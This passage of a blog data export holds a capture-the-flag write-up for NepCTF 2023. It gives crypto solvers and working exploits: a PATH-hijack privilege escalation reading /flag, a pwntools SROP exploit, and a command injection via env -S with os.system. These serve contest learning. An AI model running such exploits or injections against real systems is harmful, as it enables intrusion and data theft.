0xffffffff))\n    print(p.bit_length(), q.bit_length(), d.bit_length())\n\nprint(len(xx))\nfor xt in range(2 ** 7):\n    try:\n        predictor = ExtendMT19937Predictor()\n        for i in range(7):\n            if xt & (1 << i):\n                predictor.setrandbits(xx[i][0] >> 32, global_bits - 32)\n                predictor.setrandbits(xx[i][1] >> 32, global_bits - 32)\n            else:\n                predictor.setrandbits(xx[i][1] >> 32, global_bits - 32)\n                predictor.setrandbits(xx[i][0] >> 32, global_bits - 32)\n            predictor.setrandbits(xx[i][2] >> 32, global_bits - 32 - 32)\n        # d = predictor.predict_getrandbits(global_bits - 32)\n        # print(d)\n        break\n    except ValueError:\n        print(xt)\n        del predictor\n\nfrom gmpy2 import next_prime, invert as inverse_mod\nfrom Crypto.Cipher import PKCS1_v1_5\nfrom Crypto.PublicKey import RSA\nfrom random import getrandbits\nfrom math import lcm\nfrom sys import exit\ndef generate_prime(bits: int):\n    p = (predictor.predict_getrandbits(bits - 32) << 32)\n    return next_prime(p)\n\n\ndef generate_private_key(bits: int):\n    q, p = generate_prime(bits), generate_prime(bits)\n    n, phi = p * q, lcm(p-1, q-1)\n    print(p.bit_length(), q.bit_length())\n    print(hex(p & 0xffffffff), hex(q & 0xffffffff))\n    d = inverse_mod(0x10001, phi)\n    privateKey = RSA.construct((int(n), int(0x10001), int(d), int(p), int(q)))\n    return privateKey, p > q\n\n\nprivateKey, signal = generate_private_key(global_bits)\nCipher = PKCS1_v1_5.new(privateKey)\ncc = b\"\\x02\\x81\\xbe\\x9e^\\xdc2\\xf6V~\\x98 \\x97\\x125\\xa2-\\xe3gal\\x96\\x02\\xba\\xe8\\xaaN*\\xce\\xe98\\x8eAhSNz\\x08;Vb\\xe0\\x9d\\xe2\\x15\\xf6\\x12\\xd6\\xe5'a\\xc0\\rt\\r+\\xa4_\\xaa\\x19\\xc4\\x97>\\xa1\\r\\x14\\x18\\xfe\\xd4\\xa8~d\\xfe\\x9d\\x95>\\x0f\\x84\\xfa/p\\xfa\\x91\\x070\\xd1\\xa64\\xb2N\\x9a\\xe9\\x01\\xe9\\x91\\xa58\\x81\\xb2\\\\H&B\\xcc\\xde\\xe8|\\x87\\xed\\x0e)\\xd3\\xde\\x93f\\xa5\\x0e\\xecv\\x9c\\xcea%\\x85\\x9e\\xb8\\x10\\x9ea\\xdfnME\\x18i\\xab,\\x96{\\xab\\xf3i\\xa9I\\xc2\\xbb\\xac\\x81\\x12\\x04\\xf4J8N\\xfbE\\x0fp.P\\x9b\\xacrX\\xc1Hk\\xff->\\x9b\\xd99\\xd2L\\xc2\\x849*\\xfa\\xf3>\\x8c&23\\xceu\\xb7\\xf7\\xa2\\x81\\x15\\xacOX}\\xd3t\\xa6T\\x1b7\\xa9\\xf6\\x163\\x96\\xa1\\xe1\\xd7\\xb3e\\xccB\\x9a\\xee\\x83B|\\x92E>C\\xfb\\xd5\\xc5\\xe3#\\xa514\\xa0\\x1b\\x03\\xbf\\xf6\\xb3\\x1bK\\xa2=\\xaf3\\x03w\\x91\\xdeU\\xb51Y}%\\x89\\x00\"\nprint(Cipher.decrypt(cc, None))\n\n\n```\n\n## simple_des\n\n爆破9位恢复L，之后逆推下面这个操作即可恢复L，R的初始，由于LR来自key其中的56位，所以只要知道key的56个bit即可\n\n```python\nfor i in range(16):\n    for j in range(ROTATIONS[i]):\n        L.append(L.pop(0))\n        R.append(R.pop(0))\n```\n\nexp\n\n```python\nfrom operator import add\nfrom typing import List\nfrom functools import reduce\nfrom gmpy2 import *\nfrom Crypto.Util.number import *\n\n_IP = [57, 49, 41, 33, 25, 17, 9, 1,\n       59, 51, 43, 35, 27, 19, 11, 3,\n       61, 53, 45, 37, 29, 21, 13, 5,\n       63, 55, 47, 39, 31, 23, 15, 7,\n       56, 48, 40, 32, 24, 16, 8, 0,\n       58, 50, 42, 34, 26, 18, 10, 2,\n       60, 52, 44, 36, 28, 20, 12, 4,\n       62, 54, 46, 38, 30, 22, 14, 6\n       ]\n\n\ndef IP(plain: List[int]) -> List[int]:\n    return [plain[x] for x in _IP]\n\n\n__pc1 = [56, 48, 40, 32, 24, 16, 8,\n         0, 57, 49, 41, 33, 25, 17,\n         9, 1, 58, 50, 42, 34, 26,\n         18, 10, 2, 59, 51, 43, 35,\n         62, 54, 46, 38, 30, 22, 14,\n         6, 61, 53, 45, 37, 29, 21,\n         13, 5, 60, 52, 44, 36, 28,\n         20, 12, 4, 27, 19, 11, 3\n         ]\n\n__pc2 = [\n    13, 16, 10, 23, 0, 4,\n    2, 27, 14, 5, 20, 9,\n    22, 18, 11, 3, 25, 7,\n    15, 6, 26, 19, 12, 1,\n    40, 51, 30, 36, 46, 54,\n    29, 39, 50, 44, 32, 47,\n    43, 48, 38, 55, 33, 52,\n    45, 41, 49, 35, 28, 31\n]\nROTATIONS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]\n\n\ndef PC_1(key: List[int]) -> List[int]:\n    return [key[x] for x in __pc1]\n\n\ndef PC_2(key: List[int]) -> List[int]:\n    return [key[x] for x in __pc2]\n\n\ndef get_sub_key(key: List[int]) -> List[List[int]]:\n    key = PC_1(key)\n    L, R = key[:28], key[28:]\n\n    sub_keys = []\n\n    for i in range(16):\n        for j in range(ROTATIONS[i]):\n            L.append(L.pop(0))\n            R.append(R.pop(0))\n\n        combined = L + R\n        sub_key = PC_2(combined)\n        sub_keys.append(sub_key)\n    # print('LL=', L[:19])\n    # print('Rr=', R)\n    return sub_keys\n\ndef get_sub_key_attack(key: List[int]) -> List[List[int]]:\n    L, R = key[:28], key[28:]\n\n    sub_keys = []\n\n    for i in range(16):\n        for j in range(ROTATIONS[i]):\n            L.append(L.pop(0))\n            R.append(R.pop(0))\n\n        combined = L + R\n        sub_key = PC_2(combined)\n        sub_keys.append(sub_key)\n    # print('LL=', L[:19])\n    # print('Rr=', R)\n    return sub_keys\n\n__ep = [31, 0, 1, 2, 3, 4,\n        3, 4, 5, 6, 7, 8,\n        7, 8, 9, 10, 11, 12,\n        11, 12, 13, 14, 15, 16,\n        15, 16, 17, 18, 19, 20,\n        19, 20, 21, 22, 23, 24,\n        23, 24, 25, 26, 27, 28,\n        27, 28, 29, 30, 31, 0\n        ]\n\n__p = [15, 6, 19, 20, 28, 11, 27, 16,\n       0, 14, 22, 25, 4, 17, 30, 9,\n       1, 7, 23, 13, 31, 26, 2, 8,\n       18, 12, 29, 5, 21, 10, 3, 24\n       ]\n\n\ndef EP(data: List[int]) -> List[int]:\n    return [data[x] for x in __ep]\n\n\ndef P(data: List[int]) -> List[int]:\n    return [data[x] for x in __p]\n\n\n__s_box = [\n\n    [\n        [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],\n        [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],\n        [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],\n        [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]\n    ],\n\n    [\n        [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],\n        [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],\n        [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],\n        [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]\n    ],\n\n    [\n        [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],\n        [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],\n        [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],\n        [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]\n    ],\n\n    [\n        [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],\n        [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],\n        [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],\n        [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]\n    ],\n\n    [\n        [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],\n        [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],\n        [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],\n        [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]\n    ],\n\n    [\n        [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],\n        [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],\n        [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],\n        [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]\n    ],\n\n    [\n        [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],\n        [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],\n        [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],\n        [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]\n    ],\n\n    [\n        [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],\n        [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],\n        [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],\n        [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]\n    ]\n]\n\n\ndef S_box(data: List[int]) -> List[int]:\n    output = []\n    for i in range(0, 48, 6):\n        row = data[i] * 2 + data[i + 5]\n        col = reduce(add, [data[i + j] * (2 ** (4 - j)) for j in range(1, 5)])\n        output += [int(x) for x in format(__s_box[i // 6][row][col], '04b')]\n    return output\n\n\ndef encrypt(plain: List[int], sub_keys: List[List[int]]) -> List[int]:\n    plain = IP(plain)\n    L, R = plain[:32], plain[32:]\n\n    for i in range(16):\n        prev_L = L\n        L = R\n        expanded_R = EP(R)\n        xor_result = [a ^ b for a, b in zip(expanded_R, sub_keys[i])]\n        substituted = S_box(xor_result)\n        permuted = P(substituted)\n\n        R = [a ^ b for a, b in zip(permuted, prev_L)]\n\n    cipher = R + L\n    cipher = [cipher[x] for x in [39, 7, 47, 15, 55, 23, 63, 31,\n                                  38, 6, 46, 14, 54, 22, 62, 30,\n                                  37, 5, 45, 13, 53, 21, 61, 29,\n                                  36, 4, 44, 12, 52, 20, 60, 28,\n                                  35, 3, 43, 11, 51, 19, 59, 27,\n                                  34, 2, 42, 10, 50, 18, 58, 26,\n                                  33, 1, 41, 9, 49, 17, 57, 25,\n                                  32, 0, 40, 8, 48, 16, 56, 24]]\n\n    return cipher\n\n\ndef bitxor(plain1: List[int], plain2: List[int]) -> List[int]:\n    return [int(i) for i in\n            bin(int(''.join(str(i) for i in plain1), 2) ^ int(''.join(str(i) for i in plain2), 2))[2:].zfill(64)]\n\n\ndef add(x, y):\n    return x + y\n\ndef decrypt(plain: List[int], sub_keys: List[List[int]]) -> List[int]:\n    # plain = IP(plain)\n    L, R = plain[:32], plain[32:]\n\n    for i in range(16):\n        prev_L = L\n        L = R\n        expanded_R = EP(R)\n        xor_result = [a ^ b for a, b in zip(expanded_R, sub_keys[i])]\n        substituted = S_box(xor_result)\n        permuted = P(substituted)\n\n        R = [a ^ b for a, b in zip(permuted, prev_L)]\n\n    cipher = R + L\n    # cipher = [cipher[x] for x in [39, 7, 47, 15, 55, 23, 63, 31,\n    #                               38, 6, 46, 14, 54, 22, 62, 30,\n    #                               37, 5, 45, 13, 53, 21, 61, 29,\n    #                               36, 4, 44, 12, 52, 20, 60, 28,\n    #                               35, 3, 43, 11, 51, 19, 59, 27,\n    #                               34, 2, 42, 10, 50, 18, 58, 26,\n    #                               33, 1, 41, 9, 49, 17, 57, 25,\n    #                               32, 0, 40, 8, 48, 16, 56, 24]]\n\n    return cipher\n\nP0 = [39, 7, 47, 15, 55, 23, 63, 31,\n                                  38, 6, 46, 14, 54, 22, 62, 30,\n                                  37, 5, 45, 13, 53, 21, 61, 29,\n                                  36, 4, 44, 12, 52, 20, 60, 28,\n                                  35, 3, 43, 11, 51, 19, 59, 27,\n                                  34, 2, 42, 10, 50, 18, 58, 26,\n                                  33, 1, 41, 9, 49, 17, 57, 25,\n                                  32, 0, 40, 8, 48, 16, 56, 24]\nP0_inv = [0] * len(P0)\nfor i, b in enumerate(P0):\n    P0_inv[b] = i\n\n_IP_inv = [0] * len(_IP)\nfor i, b in enumerate(_IP):\n    _IP_inv[b] = i\n\ndef P_set(c, box):\n    return [c[_] for _ in box]\n\ndef bin2str(x: []):\n    res = bytearray()\n    for i in range(0, len(x), 8):\n        res.append(int(\"\".join(map(str, x[i:i+8])), 2))\n    return res\n\n# 爆破过程\n# check = []\n# for test in range(2 ** 9):\n# # for test in range(1):\n#     LL= [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n#     RR= [0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0]\n#     LL += list(map(int, bin(test)[2:].ljust(9, \"0\")))\n#     sub_keys = []\n#\n#     t=[0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0]\n#     for i in range(16):\n#         combined = LL + RR\n#         sub_key = PC_2(combined)\n#         sub_keys.append(sub_key)\n#         for j in range(ROTATIONS[::-1][i]):\n#             LL.insert(0, LL.pop(-1))\n#             RR.insert(0, RR.pop(-1))\n#     # print(LL)\n#     # print(RR)\n#     # sub_keys = sub_keys[::-1]\n#     # print(sub_keys)\n#     ct = decrypt(P_set(t[:64], P0_inv), sub_keys)\n#     print(test, bin2str(P_set(ct, _IP_inv)))\n#     x = bin2str(P_set(ct, _IP_inv))\n#     check.append((len(repr(x)), x, test))\n# check.sort()\n# print(check)\n# (22, bytearray(b'NepCTF{N'), 503)\n\nLL= [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\nRR= [0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0]\nLL += list(map(int, bin(503)[2:].ljust(9, \"0\")))\nsub_keys = []\n\nflag = b\"\"\nt=[0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0]\nfor i in range(16):\n    combined = LL + RR\n    sub_key = PC_2(combined)\n    sub_keys.append(sub_key)\n    for j in range(ROTATIONS[::-1][i]):\n        LL.insert(0, LL.pop(-1))\n        RR.insert(0, RR.pop(-1))\nct = decrypt(P_set(t[:64], P0_inv), sub_keys)\nraw = P_set(ct, _IP_inv)\nx = bin2str(raw)\nprint(x)\nflag += x\n\nz = raw\nkeys_t = LL + RR\nkey = [0] * 64\nfor i, b in enumerate(__pc1):\n    key[b] = keys_t[i]\nprint(key)\nprint(bin2str(key))\nct = decrypt(P_set(t[64:64*2], P0_inv), get_sub_key(bitxor(z, key))[::-1])\nraw = P_set(ct, _IP_inv)\nx = bin2str(raw)\nprint(x)\nflag += x\n\n\nz = raw\nct = decrypt(P_set(t[64*2:64*3], P0_inv), get_sub_key(bitxor(z, key))[::-1])\nraw = P_set(ct, _IP_inv)\nx = bin2str(raw)\nprint(x)\nflag += x\n\nprint(flag)\n```\n\n# Web\n\n## ez_java_checkin\n\n简单的java反序列化漏洞，一把梭\n\n![4bfea74d624d582500046b3938b36a9](2023NepCTF/4bfea74d624d582500046b3938b36a9.png)\n\n## 独步天下-转生成为镜花水月中的王者\n\n渗透签到，提示环境变量提权，一把梭\n\n```\necho \"/bin/sh\"> /tmp/ports-alive\nchmod 777 /tmp/ports-alive\nexport PATH=/tmp:$PATH\nnmap -v\ncat /flag\n```\n\n","slug":"2023NepCTF","published":true,"updated":"2025-10-28T08:00:40.743Z","_id":"cuidqnJ7vXs4Vz_S_ztUkvFlx","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>纪念一下，打的很爽Pwn抢了4道一血，可惜最后3分钟第一被超了</p>\n<p><img src=\"/p/2023NepCTF/image-20230815163205113.png\" alt=\"image-20230815163205113\"></p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h2 id=\"srop\"><a href=\"#srop\" class=\"headerlink\" title=\"srop\"></a>srop</h2><p>Srop一把梭，这里要注意，跳转是PLT表的syscall函数和真实的系统调用不一样，在函数内会将rdi赋值给rax，后面的参数寄存器都要后移一位</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;nepctf.1cepeak.cn&quot;</span>, <span class=\"number\">31943</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_eax_15 = <span class=\"number\">0x0000400754</span></span><br><span class=\"line\">buf = <span class=\"number\">0x00000601050</span></span><br><span class=\"line\">ret = <span class=\"number\">0x004007AE</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0004005B0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400813</span></span><br><span class=\"line\">stack = <span class=\"number\">0x0601a50</span></span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x8</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x1000</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x0030</span>+<span class=\"number\">8</span>) + flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall</span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">2</span></span><br><span class=\"line\">frame.rsi = stack-<span class=\"number\">0x8</span></span><br><span class=\"line\">frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x1000</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;./flag\\x00\\x00&quot;</span> + flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">3</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x100</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x40</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload += flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">1</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">1</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x100</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x40</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload += flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;length <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(payload):#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HRPVM2-0\"><a href=\"#HRPVM2-0\" class=\"headerlink\" title=\"HRPVM2.0\"></a>HRPVM2.0</h2><p>核心思想是替换文件，这里重写了kernel文件，之后python再次调用程序就可以执行了shell了</p>\n<p><img src=\"/p/2023NepCTF/image-20230814091413997.png\" alt=\"image-20230814091413997\"></p>\n<p>命令顺序如下，这里不能输入#，但是shell脚本使用Popen需要有shabang开头，但是shabang并不被sh执行，但输入又不能输入回车，所以这里可以采用env -S绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir app/templates</span><br><span class=\"line\">cd app/templates</span><br><span class=\"line\">echo #!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot;&gt;kernel</span><br><span class=\"line\">mount kernel</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2023NepCTF/image-20230814091915281.png\" alt=\"image-20230814091915281\"></p>\n<p>但是mount会需要权限校验，这里需要利用溢出漏洞，off by “two”，也就是爆破1&#x2F;16，踩中一个权限偏移内不为0的有效的堆地址，就可以绕过权限校验</p>\n<p><img src=\"/p/2023NepCTF/image-20230814091404375.png\" alt=\"image-20230814091404375\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> 